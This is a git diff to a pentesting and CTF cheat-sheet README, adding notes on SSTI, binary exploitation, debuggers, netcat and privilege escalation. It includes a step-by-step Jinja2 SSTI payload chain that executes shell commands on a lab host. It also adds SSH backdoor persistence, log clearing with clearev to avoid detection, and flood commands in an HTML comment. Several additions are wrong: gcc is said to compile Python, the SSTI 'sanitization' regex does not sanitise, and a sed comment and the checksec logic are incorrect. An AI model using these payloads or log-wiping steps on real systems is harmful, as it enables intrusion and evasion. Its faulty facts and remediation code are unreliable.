@@ -89,9 +89,11 @@
     7.  [Binary Security](#binary-security)
     8.  [The Heap and Exploitation](#the-heap)
     9.  [Format String Vulnerability](#format-string-vulnerability)
+    10. [Integer Overflow](#integer-overflow)
+    11. [ASLR Bypass](#aslr-bypass)
 15. [Reverse Engineering](#reverse-engineering)
     1.  [Assembly](#assembly)
-    2.  [Disassemblers](#disassemblers)
+    2.  [Disassemblers & Debuggers](#disassemblers--debuggers)
     3.  [Decompilers](#decompilers)
 16. [Cryptography](#cryptography)
     1.  [Generate Keys](#generate-keys)
@@ -147,7 +149,7 @@
 [dehashed](https://www.dehashed.com/) - is a hacked database search engine.     
 [Diff Checker](https://www.diffchecker.com/image-compare/) - compare images  
 [DNSDumpster](https://dnsdumpster.com) - free domain research tool that can discover hosts related to a domain   
-[DogBolt](https://godbolt.org) - decompiler explorer  
+[DogBolt](https://dogbolt.org/) - decompiler explorer  
 [EmailHippo](https://emailhippo.com) - a free email verification tool.     
 [Explain Shell](https://explainshell.com) - a tool to help you understand shell commands.  
 [ExploitDB](https://www.exploit-db.com) - searchable archive from The Exploit Database.      
@@ -1180,6 +1182,12 @@ sed looks for patterns we have defined in the form of regular expressions (regex
 Replace the word "bin" with "BK."  
 `sed 's/bin/BK/g'`
 
+Format trailing space with a colon  
+`sed 's/ */:/g' file.txt`
+
+Only get alphanumeric values  
+`sed 's/[[:digit:]]//g' file.txt`
+
 The "s" flag at the beginning stands for the substitute command. Then we specify the pattern we want to replace. After the slash (/), we enter the pattern we want to use as a replacement in the third position. Finally, we use the "g" flag, which stands for replacing all matches.
 ## whoami
 Find out what user we're currently logged in as
@@ -1214,6 +1222,12 @@ Login with a key
 
 Specify other ports than 22  
 `ssh user@ip -p <port>`
+
+Create an SSH tunnel  
+```bash
+ssh -D 8080 -C -q -N user@ip # Create a tunnel
+chromium --no-sandbox --proxy-server="socks5://localhost:8080" # Use the tunnel
+```
 ## scp
 SCP or Secure Copy Protocol is a network communication protocol that enables two computers to communicate and transfer files between them using the SSH protocol.
 
@@ -1366,6 +1380,18 @@ Hexdump to binary and then to plain text
 `-u` use upper case hex letters.  
 `-i` output in C include file style.  
 `-s` start at offset.  
+## objdump
+objdump is a command-line utility that displays information about one or more object files. It can be used to disassemble object files, executable files, shared libraries, and core dumps.
+
+**Syntax**  
+`objdump [options] [file]`
+
+**Example**  
+Dump the contents of a file  
+`objdump -d file`
+
+Get the return address  
+`objdump -d file | grep ret`
 ## exiftool
 Is a command-line application for reading, writing and editing meta information in a wide variety of files.
 
@@ -1476,7 +1502,7 @@ To install use `sudo apt install jq`
 `cat sample.json | jq` another way of prettifying json data  
 `jq -c < pretty.json` minify json data
 ## gcc
-gcc is a compiler that can be used to compile C programs. It is used to compile C programs into machine code.
+gcc is a compiler that can be used to compile C as well as Python code to an executable file.
 
 **Syntax:**  
 `gcc <options> <input>`
@@ -1802,6 +1828,19 @@ Computer B (acts as the receiving server):
 `nc -lvnp 6790 > testfile.txt`  
 Computer A (acts as the sending client):  
 `nc [IP address of computer B] 6790 < testfile.txt`  
+
+<details>
+<summary>Chat Server example</summary>
+
+```bash	
+# Computer A
+nc -lvp 1337
+
+# Computer B
+nc -v <ip_pc_a> 1337
+```
+
+</details>
 
 ### A list of most useful switches:
 `-l` Listen to connections (TCP)  
@@ -2792,7 +2831,130 @@ A successful SSRF attack can result in any of the following:
    - Open redirects, which automatically redirect users to another website, can be leveraged by attackers to redirect internal HTTP requests to a domain of their choice, especially if SSRF vulnerabilities have stringent rules allowing only specific URLs like `https://website.com/`.
 
 ## Server Side Template Injection (SSTI)
-`TO BE ADDED`
+Server-Side Template Injection (SSTI) is a vulnerability that occurs when an attacker can control the template processing engine on the server-side. This allows the attacker to inject and execute code on the server.
+
+**Example of SSTI in Python Flask**
+
+```python
+from flask import Flask, render_template_string
+app = Flask(__name__)
+
+@app.route("/profile/<user>")
+def profile_page(user):
+    template = f"<h1>Welcome to the profile of {user}!</h1>"
+
+    return render_template_string(template)
+
+app.run()
+```
+
+In the above code, the `render_template_string` function is used to render the template. If the `user` input is not sanitized, an attacker can inject template code to execute arbitrary commands on the server.
+
+For example, if the attacker sends the following request: `http://website.com/profile/{{7*7}}`, the server will render the template as `<h1>Welcome to the profile of 49!</h1>`. This shows that the server is executing the code provided by the attacker.
+
+
+### Finding an SSTI
+- **Identifying Vulnerable Input:** Attackers look for input fields within the application that are used to render templates, such as user profiles or comments, which can be manipulated to trigger SSTI.
+- **Fuzzing:** Most template engines will use a similar character set for their "special functions" which makes it relatively quick to detect if it's vulnerable to SSTI. Those are `${{<%[%'"}}%`. To manually fuzz all of these characters, they can be sent one by one following each other.
+
+<details>
+<summary>Manual Fuzzing example</summary> <br>
+
+  ```python
+  "http://10.10.118.110:5000/profile/$"
+  "http://10.10.118.110:5000/profile/$\{"
+  "http://10.10.118.110:5000/profile/${{"
+  "http://10.10.118.110:5000/profile/${{<"
+  ```
+
+  One of these may yield an error message or a different response, indicating that the application is vulnerable to SSTI.
+
+</details>
+
+### Detecting Template Engines
+In the best case scenario, the error message will include the template engine, which marks this step complete. However, if this is not the case, we can use a decision tree to help us identify the template engine:
+
+![SSTI](Images/SSTI.webp)
+- Green arrow - The expression evaluated (i.e 42)
+- Red arrow - The expression is shown in the output (i.e ${7*7})
+
+### Exploiting SSTI
+Once the template engine is identified, we can use the documentation to exploit the SSTI vulnerability. For this [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is a great resource.
+
+<details>
+<summary>Exploitation POC for Jinja2</summary> <br>
+Python allows us to call the current class instance with <code>.__class__</code>, we can call this on an empty string:
+
+```txt
+http://10.10.118.110:5000/profile/{{ ''.__class__ }}.
+```
+
+Classes in Python have an attribute called <code>.\_\_mro\_\_</code> that allows us to climb up the inherited object tree:
+
+```txt
+http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__ }}.
+```	
+
+Since we want the root object, we can access the second property (first index):
+
+```txt
+http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1] }}.
+```	
+
+Objects in Python have a method called <code>.\_\_subclassess\_\_</code> that allows us to climb down the object tree:
+
+```txt
+http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}.
+```	
+
+Now we need to find an object that allows us to run shell commands. **Example**: The position in the list is 400 (index 401):
+
+```txt
+http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}.
+```	
+
+The above payload essentially calls the subprocess.Popen method, now all we have to do is invoke it (use the code above for the syntax)
+
+```txt
+http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}.
+```	
+
+</details>
+
+### Remediation
+To prevent SSTI vulnerabilities, developers should make use of secure methods and sanitization techniques.
+
+<details>
+<summary>Secure Methods</summary>
+
+Most template engines will have a feature that allows you to pass input in as data, rather that concatenating input into the template.
+
+```python
+# Insecure: Concatenating input
+template = f"<h1>Welcome to the profile of {user}!</h1>"
+return render_template_string(template)
+
+# Secure: Passing input as data
+template = "<h1>Welcome to the profile of {{ user }}!</h1>"
+return render_template_string(template, user=user)
+```
+</details>
+
+<details>
+<summary>Sanitization</summary>
+
+Creating a whitelist character set for user input can help prevent SSTI vulnerabilities. This can be done by checking the input against a list of allowed characters using a regular expression.
+
+```python
+import re
+
+# Remove everything that isn't alphanumeric
+user = re.sub("^[A-Za-z0-9]", "", user)
+template = "<h1>Welcome to the profile of {{ user }}!</h1>"
+return render_template_string(template, user=user)
+```
+</details>
+
 ## Server Side Includes (SSI)
 Server Side Includes (SSI) is a simple interpreted server-side scripting language used almost exclusively for the Web. It is most useful for including the contents of one or more files into a web page on a web server, using its #include directive.
 
@@ -3061,6 +3223,9 @@ helpful when dealing with audio steganography. You can reveal hidden shapes in a
 
 `Layer->Add Spectrogram` should work
 
+### Zero-Width Characters
+Zero-width characters are characters that have no width when displayed, but can be used to hide information in text. These characters are often used in steganography to hide messages in plain sight. A useful tool for detecting zero-width characters is [Unicode Steganography with Zero-Width Characters
+](https://330k.github.io/misc_tools/unicode_steganography.html).
 ## Memory analysis
 Traditionel computer forensics can be made out of volatile memory.
 
@@ -3111,7 +3276,10 @@ To see if a stack overflow is possible, run the following command:
 checksec --file=<executable>
 ```
 If the output contains `Canary found` and `NX enabled`, then a stack overflow is possible. See more about this command [here](/More/Binary%20Exploitation/Checksec.md).
-
+### Stack Shellcode
+`TO BE ADDED`
+### Return to Win (Ret2Win)
+`TO BE ADDED`
 ## Calling Conventions
 `TO BE ADDED`
 ## Global Offset Table (GOT)
@@ -3131,16 +3299,20 @@ A very simple example of a buffer overflow exploit looks like the following:
 python -c "print ('A' * 100)" | ./<executable>
 ```
 
+### Variable Overwrite
+`TO BE ADDED`
 ## Return Oriented Programming (ROP)
 Return Oriented Programming (ROP) works by chaining together small pieces of code, called "gadgets," that are already present in the target program's memory space to perform a series of operations that the attacker desires. Each gadget typically ends with a "return" instruction that tells the program where to continue executing code after the gadget has finished. 
 
 By carefully selecting and chaining together gadgets that end with a return instruction, attackers can construct a "ROP chain" that allows them to execute their own code on the target system. This technique can be used to bypass security measures such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).
-
 ## Binary Security
 A tool that can detect binary security security mechanisms is `checksec`. I've written about the tool [here](/More/Binary%20Exploitation/Checksec/Readme.md).
 
 ### No eXecute (NX)
-NX is a hardware security feature that prevents execution of code from non-executable memory regions. This helps to prevent certain types of attacks, such as buffer overflow exploits, which attempt to execute malicious code by overwriting the memory.
+NX is a hardware security feature that prevents execution of code from non-executable memory regions. This helps to prevent certain types of attacks, such as buffer overflow exploits, which attempt to execute malicious code by overwriting the memory. Also means no shellcode can be executed from the stack.
+
+### Position Independent Executable (PIE)
+PIE is a security feature that randomizes the base address of the program's code and data sections at runtime. This makes it more difficult for an attacker to predict the memory address of a vulnerable function or piece of data, and thus makes it harder to exploit certain types of vulnerabilities.
 
 ### Address Space Layout Randomization (ASLR)
 ASLR  is a security technique that randomizes the memory layout of a process at runtime. This makes it more difficult for an attacker to predict the memory address of a vulnerable function or piece of data, and thus makes it harder to exploit certain types of vulnerabilities.
@@ -3189,8 +3361,17 @@ for i in range(1, 50):
     print('%' + str(i) + '$s')
     print(r.recv())
 ```
+## Integer Overflow
+Integer overflow is a type of software vulnerability that occurs when an integer value is incremented beyond its maximum value, causing it to "wrap around" to a negative value. This can lead to unexpected behavior in the program, such as crashes or security vulnerabilities.
 
-
+### Data types
+**BYTE** = 8 bits  
+**WORD** = 16 bits  
+**DWORD** = Double Word (32 bits)  
+**QWORD** = Quad Word (64 bits)
+## ASLR Bypass
+### Return to PLT (Ret2plt)
+`TO BE ADDED`
 # Reverse Engineering
 Reverse-engineering is the creative process of analyzing software and understanding it without having access to the source code. It is the process by which software is deconstructed in a way that reveals its innermost details such as its structure, function and operation.
 
@@ -3198,25 +3379,35 @@ Reverse-engineering is the creative process of analyzing software and understand
 Find the in-depth content for the Assembly x86-64 language [here](/More/Assembly/Readme.md) inside this repository.
 
 `TO BE ADDED`
-## Disassemblers
-A disassembler is a computer program that translates machine language into assembly language—the inverse operation to that of an assembler.  
+## Disassemblers & Debuggers
+A disassembler is a computer program that translates machine language into assembly language—the inverse operation to that of an assembler. A debugger is a computer program that is used to test and debug other programs.
+
+### ltrace & strace
+`strace` is a debugging utility in Linux used to monitor the system calls used by a program and all the signals it receives.
+
+`ltrace` is a debugging utility in Linux used to display the calls a user space application makes to shared libraries. It traces the library calls made by a process and the signals received by the process.
 
 ### gdb
 GDB, the GNU Project debugger, allows you to see what is going on `inside' another program while it executes -- or what another program was doing at the moment it crashed.
 
-```bash
-berkankutuk@kali:~$ gdb <binary file>` # opens the binary file in gdb
+```console
+berkankutuk@kali:~$ gdb <binary file> # opens the binary file in gdb
 
-(gdb)> break <function name> # sets a breakpoint at the given function
+(gdb)> set disassembly-flavor intel # sets the disassembly flavor to intel
+
+(gdb)> break <function_name> # sets a breakpoint at the given function
 (gdb)> break *<addr> # sets a breakpoint at the given address
+(gdb)> si # steps through the program one instruction at a time
+(gdb)> ni # steps over the current instruction
 (gdb)> run # runs the program until it reaches the first breakpoint
-(gdb)> run < <input file> # runs the program with the given input file
-(gdb)> disassemble <function name> # disassembles the given function
-(gdb)> x /s <addr> # prints a string from memory address
+(gdb)> run <input file> # runs the program with the given input file
+(gdb)> disassemble <function_name> | main # disassembles the given function
+(gdb)> x/s <addr> # prints a string from memory address
 (gdb)> continue # continues the execution of the program
 (gdb)> info registers # prints the values of the registers
 (gdb)> info variables # prints the values of the variables
 (gdb)> info functions # prints the functions
+(gdb)> set $eax=0 # sets the value of the eax register to 0
 (gdb)> exploit # runs the exploit
 (gdb)> x # inspect memory locations
 (gdb)> quit # quits gdb
@@ -3225,7 +3416,7 @@ berkankutuk@kali:~$ gdb <binary file>` # opens the binary file in gdb
 ### radare2
 Radare2 is an open-source framework that can perform disassembly, debugging, analysis, comparing data and manipulation of binary files. 
 
-```bash
+```console
 berkankutuk@kali:~$ r2 <binary file>` # opens the binary file in radare2
 berkankutuk@kali:~$ r2 -d <binary file>` # opens the binary file in radare2 in debug mode 
 
@@ -3234,8 +3425,13 @@ berkankutuk@kali:~$ r2 -d <binary file>` # opens the binary file in radare2 in d
 [0x00400510]> afl # List functions
 [0x00400510]> s main # Go to main function
 [0x00400510]> pdf # Print disassembled function
+[0x00400510]> db <addr> # Set breakpoint at address
+[0x00400510]> dc # Continue execution
+[0x00400510]> dr # Show registers
+[0x00400510]> s # step instruction
 [0x00400510]> s/ password # Search for data within the code
 [0x00400510]> V # Hex view
+[0x00400510]> VV # Visual mode
 
 # Debug mode
 [0x00400510]> dc # Launch the executable
@@ -3510,7 +3706,7 @@ For more, see this page: [Samba](More/Windows/Samba.md)
 # Shells and Privilege Escalation
 ## Public Exploits
 **Google**   
-`openssh 7.2 exploit`
+A simple search: `openssh 7.2 exploit`
 
 **Exploit-DB**  
 ```bash
@@ -3622,9 +3818,21 @@ I've explained the /etc/passwd format [here](/More/Linux%20Reinforced%20(CLI)/Pa
 Lets say the `cat` command had the 's' in its SUID. Then you would be able to use something like the following command to read a flag:  
 `find /home/berkan/flag1.txt -exec cat {} \;`
 
-### Keeping a backdoor
+### Persistence
 #### Using SSH
 Create a `.ssh` folder in the home directory of the user you want to keep a backdoor. Keep in mind that the permissions of the `.ssh` folder should be `700` and the files withing should be `600`.
+
+### Using exploit suggesters
+MetaSploit has a tool called `suggester` that can be used to find exploits for a specific system.  
+```bash
+msf6 > use post/multi/recon/local_exploit_suggester
+```
+
+### Clean up
+After you have escalated your privileges, you should clean up the logs to avoid detection. One tool for this is the `clearev` command for metasploit.  
+```bash
+msf6 > clearev
+```
 
 # Vulnerabilities & Threats
 A vulnerability in cybersecurity is defined as a weakness or flaw in the design, implementation or behaviours of a system or application. An attacker can exploit these weaknesses to gain access to unauthorised information or perform unauthorised actions
@@ -3677,6 +3885,12 @@ Hyperlinks and IP addresses should be [defanged](https://www.ibm.com/docs/en/rso
 Expand shortened links with this [tool](https://www.expandurl.net).
 ## Denial of Service (DoS & DDoS)
 `to be added`
+
+<!-- ping -s 1300 -f <IP>
+hping -S -V --flood <IP>
+masscan -p80,443,22 <IP>/24 --rate=1000
+amass enum -d <domain>
+ -->
 
 ## Misconfigurations
 ### Printer Hacking (IPP)
